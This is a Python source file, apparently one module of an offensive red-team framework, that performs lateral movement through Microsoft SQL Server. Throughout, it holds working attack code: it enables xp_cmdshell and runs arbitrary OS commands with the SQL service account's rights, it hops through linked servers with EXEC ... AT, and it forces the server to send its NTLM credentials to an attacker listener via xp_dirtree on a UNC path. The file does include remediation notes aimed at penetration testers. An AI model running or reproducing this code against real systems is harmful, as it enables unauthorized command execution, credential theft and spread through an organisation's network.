"""
MSSQL Lateral Movement — lateral.mssql
MITRE: T1505.001 — SQL Stored Procedures (xp_cmdshell)

Lateral movement via Microsoft SQL Server exploitation:
  1. xp_cmdshell — enable via sp_configure and execute OS commands as SQL service account
  2. Linked server hop — lateral movement through SQL server trust relationships
  3. EXECUTE AS LOGIN — impersonate SA or privileged login
  4. UNC path injection — coerce NTLM auth to attacker listener via xp_dirtree/bulk insert

Prerequisites: SQL credentials (SA or db_owner). Port 1433 accessible.
               KnowledgeBase entry kb-mssql already exists.

OPSEC: MEDIUM — SQL queries appear legitimate in server logs.
       xp_cmdshell re-enable is logged by SQL Audit if enabled.
"""
from __future__ import annotations

import asyncio
from typing import Any

from ares.core.campaign import Finding, Severity
from ares.core.logger import audit, get_logger
from ares.core.security import sanitize_hostname
from ares.modules.base import BaseModule, OpsecLevel
from ares.core.tracing import trace_module

logger = get_logger("ares.modules.lateral.mssql")


class MSSQLModule(BaseModule):
    """
    lateral.mssql — MSSQL lateral movement via xp_cmdshell, linked servers, EXECUTE AS LOGIN, and UNC path NTLM coer

    OPSEC: MEDIUM
    MITRE: "T1505.001"
    OUTPUTS:  "command_output", "lateral_session"
    """
    MODULE_ID          = "lateral.mssql"
    MODULE_NAME        = "MSSQL Lateral Movement"
    MODULE_CATEGORY    = "lateral"
    MODULE_DESCRIPTION = (
        "MSSQL lateral movement via xp_cmdshell, linked servers, "
        "EXECUTE AS LOGIN, and UNC path NTLM coercion."
    )
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    OPSEC_LEVEL        = OpsecLevel.MEDIUM
    REQUIRES           = []
    OUTPUTS            = ["command_output", "lateral_session"]
    MITRE_TECHNIQUES   = ["T1505.001"]

    async def validate(self, ctx: "Any") -> None:
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        if not isinstance(ctx, ExecutionContext):
            return
        target = getattr(ctx, "target", "") or ctx.params.get("target", "")
        if not target:
            raise ModuleValidationError(
                "lateral.mssql requires 'target' — IP or hostname of MSSQL server.",
                module_id=self.MODULE_ID, field="target",
            )
        username = ctx.params.get("username", "") or ctx.params.get("sql_user", "")
        if not username:
            raise ModuleValidationError(
                "lateral.mssql requires SQL credentials — pass 'username' and 'password'. "
                "Use 'sa' or a db_owner account for xp_cmdshell.",
                module_id=self.MODULE_ID, field="username",
            )

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+).
        Thin adapter: extract params from ctx → call run() → return ModuleResult.
        """
        from ares.modules.base import ModuleResult
        if getattr(ctx, "dry_run", False):
            return ModuleResult(status="dry_run", module_id=self.MODULE_ID,
                                raw={"dry_run": True})

        target   = sanitize_hostname(
            getattr(ctx, "target", "") or ctx.params.get("target", "")
        )
        username  = ctx.params.get("username", "") or ctx.params.get("sql_user", "sa")
        password  = ctx.params.get("password", "") or ctx.params.get("secret", "")
        port      = int(ctx.params.get("port", 1433))
        command   = ctx.params.get("command", "whoami")
        technique = ctx.params.get("technique", "xp_cmdshell")  # xp_cmdshell|linked|unc_coerce
        linked    = ctx.params.get("linked", "")
        listener  = ctx.params.get("listener", "") or ctx.params.get("listener_ip", "")   # for UNC coercion

        findings, raw = await self.run(
            target=target, username=username, password=password,
            port=port, command=command, technique=technique,
            linked=linked, listener=listener,
        )
        return ModuleResult(
            status="success" if findings else "partial",
            findings=findings, raw=raw, module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("lateral.mssql")
    async def run(self, target: str, username: str, password: str,
                  port: int = 1433, command: str = "whoami",
                  technique: str = "xp_cmdshell", linked: str = "",
                  listener: str = "",
                  **kwargs: Any):
        await self.before_request(target, "default")
        logger.info("mssql_start", target=target, technique=technique)
        audit("mssql_lateral", actor=username, technique="T1505.001",
              source="operator", target=target, detail=f"technique={technique}")

        loop = asyncio.get_running_loop()

        # First enumerate: get server info + linked servers
        info = await loop.run_in_executor(
            None,
            lambda: self._enum_server_sync(target, username, password, port),
        )

        if info.get("error"):
            err_msg = info["error"].lower()
            if "login failed" in err_msg or "password" in err_msg or \
               "authentication" in err_msg or "18456" in err_msg:
                from ares.core.errors import AuthenticationFailed
                raise AuthenticationFailed(
                    f"MSSQL login failed on {target}:{port} for user '{username}'. "
                    "Check SQL credentials (error 18456 = wrong username/password).",
                    username=username, module_id=self.MODULE_ID, target=target,
                )
            if "timed out" in err_msg or "connection refused" in err_msg or \
               "unreachable" in err_msg:
                from ares.core.errors import NetworkError
                raise NetworkError(
                    f"Cannot reach MSSQL on {target}:{port}. "
                    "Port 1433 may be filtered or SQL Server not running."
                )
            logger.warning("mssql_connect_failed", error=info["error"][:100])
            return [], {"error": info["error"], "target": target}

        logger.info("mssql_connected",
                    version=info.get("version", "")[:50],
                    is_sa=info.get("is_sysadmin"),
                    linked=len(info.get("linked_servers", [])))

        # Finding: access confirmed
        self.finding(
            title       = f"MSSQL Access Confirmed: {target} ({username})",
            description = (
                f"SQL Server access confirmed on {target}:{port} as '{username}'. "
                + (f"Sysadmin: {'YES' if info.get('is_sysadmin') else 'NO'}. "
                   if info.get("is_sysadmin") is not None else "")
                + (f"Linked servers: {len(info.get('linked_servers', []))}. "
                   if info.get("linked_servers") else "")
                + f"Version: {info.get('version', 'unknown')[:60]}"
            ),
            severity    = Severity.HIGH,
            mitre_technique = "T1505.001",
            mitre_tactic    = "Lateral Movement",
            evidence = {
                "target":         target,
                "port":           port,
                "sql_user":       username,
                "is_sysadmin":    info.get("is_sysadmin"),
                "version":        info.get("version", "")[:80],
                "linked_servers": info.get("linked_servers", [])[:10],
                "databases":      info.get("databases", [])[:10],
            },
            remediation = (
                "Restrict SQL login permissions. Disable xp_cmdshell. "
                "Audit linked server configurations. Enable SQL Audit logging. "
                "Disable SA account if not required."
            ),
            host = target, confidence = 1.0,
        )

        # xp_cmdshell execution
        output = ""
        if technique == "xp_cmdshell" and info.get("is_sysadmin"):
            output = await loop.run_in_executor(
                None,
                lambda: self._xp_cmdshell_sync(target, username, password, port, command),
            )
            if output:
                self.finding(
                    title       = f"MSSQL RCE via xp_cmdshell on {target}",
                    description = (
                        f"Executed OS command via xp_cmdshell on {target}: '{command}'. "
                        f"Output: {output[:200]}"
                    ),
                    severity    = Severity.CRITICAL,
                    mitre_technique = "T1505.001",
                    mitre_tactic    = "Lateral Movement",
                    evidence    = {"command": command, "output": output[:500], "target": target},
                    remediation = (
                        "Disable xp_cmdshell: EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE. "
                        "Rotate SA password. Audit xp_cmdshell usage in SQL logs."
                    ),
                    host = target, confidence = 1.0,
                )

        # Linked server hop
        elif technique == "linked" and (linked or info.get("linked_servers")):
            linked_server = linked or info["linked_servers"][0]
            linked_output = await loop.run_in_executor(
                None,
                lambda: self._linked_server_sync(
                    target, username, password, port, linked_server, command,
                ),
            )
            if linked_output:
                self.finding(
                    title       = f"MSSQL Linked Server RCE: {linked_server}",
                    description = (
                        f"Executed command via linked server '{linked_server}' "
                        f"from {target}: '{command}'"
                    ),
                    severity    = Severity.CRITICAL,
                    mitre_technique = "T1505.001",
                    mitre_tactic    = "Lateral Movement",
                    evidence    = {"linked_server": linked_server,
                                   "output": linked_output[:300]},
                    host = target, confidence = 0.9,
                    remediation = "Remove unnecessary linked servers. Disable xp_cmdshell on linked servers.",
                )
                output = linked_output

        # UNC path NTLM coercion via xp_dirtree
        elif technique == "unc_coerce" and listener:
            coerced = await loop.run_in_executor(
                None,
                lambda: self._unc_coerce_sync(target, username, password, port, listener),
            )
            if coerced:
                self.finding(
                    title       = f"MSSQL NTLM Coercion to {listener} from {target}",
                    description = (
                        f"MSSQL server {target} made NTLM authentication attempt to "
                        f"\\\\{listener}\\share via xp_dirtree. "
                        "Check lateral.smb_relay for captured SQL service account hash."
                    ),
                    severity    = Severity.HIGH,
                    mitre_technique = "T1187",
                    mitre_tactic    = "Credential Access",
                    evidence    = {"target": target, "listener": listener},
                    host = target, confidence = 0.85,
                    remediation = "Block outbound SMB from SQL servers. Disable xp_dirtree.",
                )

        raw = {
            "target":          target,
            "port":            port,
            "technique":       technique,
            "is_sysadmin":     info.get("is_sysadmin"),
            "version":         info.get("version", "")[:80],
            "linked_servers":  info.get("linked_servers", []),
            "databases":       info.get("databases", []),
            "command":         command,
            "output":          output[:1000] if output else "",
        }
        await self.noise.jitter.sleep()
        raw["command_output"] = raw.get("output", "")  # OUTPUTS key
        raw["lateral_session"] = raw.get("target", "")  # OUTPUTS key
        return self._findings[:], raw

    def _enum_server_sync(self, target: str, username: str, password: str,
                           port: int) -> dict:
        """Connect to MSSQL and enumerate server info. Sync — runs in executor."""
        try:
            import impacket.tds as tds  # type: ignore[import]

            ms = tds.MSSQL(target, port)
            ms.connect()
            ms.login(None, username, password, None, None, False)

            info: dict = {}

            # Server version
            try:
                res = ms.sql_query("SELECT @@VERSION")
                info["version"] = str(res[0].get("", "")) if res else ""
            except Exception:
                info["version"] = ""

            # Check sysadmin
            try:
                res = ms.sql_query("SELECT IS_SRVROLEMEMBER('sysadmin')")
                info["is_sysadmin"] = bool(res[0].get("", 0)) if res else False
            except Exception:
                info["is_sysadmin"] = False

            # Linked servers
            try:
                res = ms.sql_query("SELECT name FROM sys.servers WHERE is_linked=1")
                info["linked_servers"] = [r.get("name", "") for r in res]
            except Exception:
                info["linked_servers"] = []

            # Databases
            try:
                res = ms.sql_query("SELECT name FROM sys.databases")
                info["databases"] = [r.get("name", "") for r in res]
            except Exception:
                info["databases"] = []

            ms.disconnect()
            return info

        except ImportError:
            # impacket TDS not available — try pymssql fallback
            return self._enum_pymssql(target, username, password, port)
        except Exception as exc:
            raise  # propagate to async wrapper for _classify_error

    def _enum_pymssql(self, target: str, username: str, password: str,
                       port: int) -> dict:
        """Fallback using pymssql if impacket TDS unavailable."""
        try:
            import pymssql  # type: ignore[import]
            conn = pymssql.connect(target, username, password, "master", port=port, timeout=10)
            cur  = conn.cursor()
            info: dict = {"linked_servers": [], "databases": []}
            try:
                cur.execute("SELECT @@VERSION")
                info["version"] = str(cur.fetchone()[0])[:80]
            except Exception:
                info["version"] = ""
            try:
                cur.execute("SELECT IS_SRVROLEMEMBER('sysadmin')")
                info["is_sysadmin"] = bool(cur.fetchone()[0])
            except Exception:
                info["is_sysadmin"] = False
            conn.close()
            return info
        except ImportError:
            return {"error": "No MSSQL driver available — pip install pymssql"}
        except Exception as exc:
            raise  # propagate to async wrapper for _classify_error

    def _xp_cmdshell_sync(self, target: str, username: str, password: str,
                           port: int, command: str) -> str:
        """Enable xp_cmdshell and execute command. Returns output."""
        try:
            import pymssql  # type: ignore[import]
            conn = pymssql.connect(target, username, password, "master", port=port, timeout=15)
            cur  = conn.cursor()
            # Enable advanced options + xp_cmdshell
            cur.execute("EXEC sp_configure 'show advanced options', 1; RECONFIGURE")
            cur.execute("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE")
            safe_cmd = command.replace("'", "''")  # SQL-escape single quotes
            cur.execute(f"EXEC xp_cmdshell '{safe_cmd}'")
            rows = cur.fetchall()
            output = "\n".join(str(r[0]) for r in rows if r[0] is not None)
            conn.close()
            return output
        except Exception as exc:
            logger.debug("xp_cmdshell_failed", error=str(exc)[:80])
            return ""

    def _linked_server_sync(self, target: str, username: str, password: str,
                             port: int, linked: str, command: str) -> str:
        """Execute command via linked server xp_cmdshell."""
        try:
            import pymssql  # type: ignore[import]
            conn = pymssql.connect(target, username, password, "master", port=port, timeout=15)
            cur  = conn.cursor()
            safe_cmd    = command.replace("'", "''")   # SQL-escape
            safe_linked = linked.replace("[", "").replace("]", "").replace(";", "")  # strip bracket injection
            q = (f"EXEC ('{safe_cmd}') AT [{safe_linked}]")
            cur.execute(q)
            rows = cur.fetchall()
            conn.close()
            return "\n".join(str(r[0]) for r in rows if r[0] is not None)
        except Exception as exc:
            logger.debug("linked_server_exec_failed", error=str(exc)[:80])
            return ""

    def _unc_coerce_sync(self, target: str, username: str, password: str,
                          port: int, listener_ip: str) -> bool:
        """Coerce NTLM auth from SQL server to listener via xp_dirtree."""
        from ares.core.security import sanitize_hostname
        listener_ip = sanitize_hostname(listener_ip)  # prevent injection into xp_dirtree UNC path
        try:
            import pymssql  # type: ignore[import]
            conn = pymssql.connect(target, username, password, "master", port=port, timeout=10)
            cur  = conn.cursor()
            try:
                cur.execute(f"EXEC xp_dirtree '\\\\{listener_ip}\\share'")
            except Exception:
                pass   # expected — NTLM sent before this fails
            conn.close()
            return True
        except Exception as exc:
            logger.debug("unc_coerce_failed", error=str(exc)[:80])
            return False
